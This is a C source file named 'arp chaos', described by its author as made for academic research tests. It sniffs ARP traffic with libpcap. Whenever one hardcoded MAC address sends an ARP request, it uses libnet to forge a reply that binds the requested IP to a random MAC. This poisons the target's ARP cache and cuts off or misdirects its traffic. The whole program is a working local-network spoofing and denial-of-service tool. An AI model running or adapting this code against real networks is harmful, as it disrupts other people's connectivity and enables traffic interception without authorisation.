/*

  Author :  Rafael Ugolini
  E-Mail :  rafael.ugolini@gmail.com
  Program:  arp chaos
  About  :  This program was made to do some tests in my academic research.

  This program is free software: you can redistribute it and/or modify
  it under the terms of the GNU General Public License as published by
  the Free Software Foundation, either version 3 of the License, or
  (at your option) any later version.
  
  This program is distributed in the hope that it will be useful,
  but WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
  GNU General Public License for more details.
  
  You should have received a copy of the GNU General Public License
  along with this program.  If not, see <http://www.gnu.org/licenses/>.
  
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <libnet.h>
#include <pcap.h>
#include <arpa/inet.h>
#include <netinet/ether.h>

#define MTU 1500
#define ARP_REQUEST 0x100
#define ARP_REPLY 0x200
#define INTERFACE "en0"

typedef struct 
{
        u_int16_t h_addr; 
        u_int16_t p_addr;
        u_int8_t  h_len;
        u_int8_t  p_len;
        u_int16_t op;

        u_int8_t ether_shost[ETHER_ADDR_LEN]; 
        u_int8_t ip_src[4];                   
        u_int8_t ether_dhost[ETHER_ADDR_LEN]; 
        u_int8_t ip_dst[4];
} ArpHeader;

int ArpReply(char *ifname, u_int8_t *src, u_int8_t *dst) {
  
	libnet_t *l;
	struct libnet_ether_addr *e_addr;
        char errbuf[LIBNET_ERRBUF_SIZE];
        u_char rand_mac[6] = {rand()%16, rand()%16, rand()%16, rand()%16, rand()%16, rand()%16};

        if ((l = (libnet_t *)libnet_init(LIBNET_LINK, ifname, errbuf)) == NULL ) {
                printf("%s\n", errbuf);
                return -1;
        }
        
        e_addr = libnet_get_hwaddr(l);

        if (libnet_build_arp(ARPHRD_ETHER,
                             ETHERTYPE_IP,
                             6,
                             4,
                             ARPOP_REPLY,
                             rand_mac,
                             dst,
                             e_addr->ether_addr_octet,
                             src,
                             NULL,
                             0,
                             l,
                             0) == -1) {
                return -1;
        }

        if (libnet_build_ethernet(rand_mac,
                                  e_addr->ether_addr_octet,
                                  ETHERTYPE_ARP,
                                  NULL,
                                  0,
                                  l,
                                  0)
            == -1)
                return -1;

        if (libnet_write(l) == -1)
                printf("%s\n", libnet_geterror(l));
        
        libnet_destroy(l);	

        return 0;
}


void ArpHandler(u_char *args, const struct pcap_pkthdr *header, const u_char *packet) {

        
        struct libnet_ethernet_hdr *ether;
        struct libnet_ipv4_hdr *ip;
        ArpHeader *arp;
        
        ether = (struct libnet_ethernet_hdr *) (packet);
        arp = (ArpHeader *) (packet + sizeof(struct libnet_ethernet_hdr));
        
        if (arp->op == ARP_REQUEST) {
                printf("Request Packet\n");
                if (arp->ether_shost[0] == 0x00 &&
                    arp->ether_shost[1] == 0x23 &&
                    arp->ether_shost[2] == 0xae &&
                    arp->ether_shost[3] == 0xe8 &&
                    arp->ether_shost[4] == 0x1b &&
                    arp->ether_shost[5] == 0x1d )


                    ArpReply(INTERFACE, arp->ip_src, arp->ip_dst);
        }        

        else if (arp->op == ARP_REPLY)
                printf("Reply Packet\n");

        printf("\tFROM:%d.%d.%d.%d\t%x:%x:%x:%x:%x:%x\n\tTO:%d.%d.%d.%d\t%x:%x:%x:%x:%x:%x\n\n", 
               arp->ip_src[0], arp->ip_src[1], arp->ip_src[2], arp->ip_src[3],
               arp->ether_shost[0] ,arp->ether_shost[1], arp->ether_shost[2], arp->ether_shost[3],
               arp->ether_shost[4], arp->ether_shost[5],
               arp->ip_dst[0], arp->ip_dst[1], arp->ip_dst[2], arp->ip_dst[3],
               arp->ether_dhost[0] ,arp->ether_dhost[1], arp->ether_dhost[2], arp->ether_dhost[3],
               arp->ether_dhost[4], arp->ether_dhost[5]);

}

int main (int argc, char **argv) {

        pcap_t *pcap;
        char errbuf[PCAP_ERRBUF_SIZE];
        struct bpf_program filter;
        bpf_u_int32 net;
        bpf_u_int32 mask;
        char bpf_filter[] = "arp";
        pcap_lookupnet(INTERFACE, &net, &mask, errbuf);

        pcap = pcap_open_live(INTERFACE, 1500, 0, 200, errbuf);
        pcap_compile(pcap, &filter, bpf_filter, 0, net);
        pcap_setfilter(pcap, &filter);

        while(1) {
                pcap_loop(pcap, 1, ArpHandler, NULL);
        }
}
